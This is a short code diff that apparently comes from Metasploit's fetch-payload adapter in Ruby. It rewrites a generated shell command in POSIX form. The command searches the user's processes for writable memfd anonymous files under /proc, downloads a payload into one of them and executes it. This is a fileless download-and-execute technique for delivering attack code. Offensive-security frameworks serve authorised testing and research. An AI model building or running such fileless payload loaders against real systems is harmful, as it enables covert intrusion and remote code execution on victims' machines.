@@ -237,19 +237,20 @@ module Msf::Payload::Adapter::Fetch
     cmd = 'FOUND=0'
     cmd << ";for i in $(ps -u $USER | awk '{print $1}')"
     # already found anonymous file where we can write
-    cmd << '; do if [[ $FOUND -eq 0 ]]'
+    cmd << '; do if [ $FOUND -eq 0 ]'
 
     # look for every symbolic link with write rwx permissions
     # if found one, try to download payload into the anonymous file
     # and execute it
-    cmd << '; then while read f'
-    cmd << '; do if [[ $(ls -al $f | grep -o memfd) ]]'
-    cmd << "; then #{get_file_cmd}"
-    cmd << '; $f'
+    cmd << '; then for f in $(find /proc/$i/fd -type l -perm u=rwx 2>/dev/null)'
+    cmd << '; do if [ $(ls -al $f | grep -o "memfd" >/dev/null; echo $?) -eq "0" ]'
+    cmd << "; then if [ $( #{get_file_cmd} >/dev/null; echo $?) -eq \"0\" ]"
+    cmd << '; then $f'
     cmd << '; FOUND=1'
     cmd << '; break'
     cmd << '; fi'
-    cmd << '; done <<< $(find /proc/$i/fd -type l -perm u=rwx 2>/dev/null)'
+    cmd << '; fi'
+    cmd << '; done'
     cmd << '; fi'
     cmd << '; done'
 
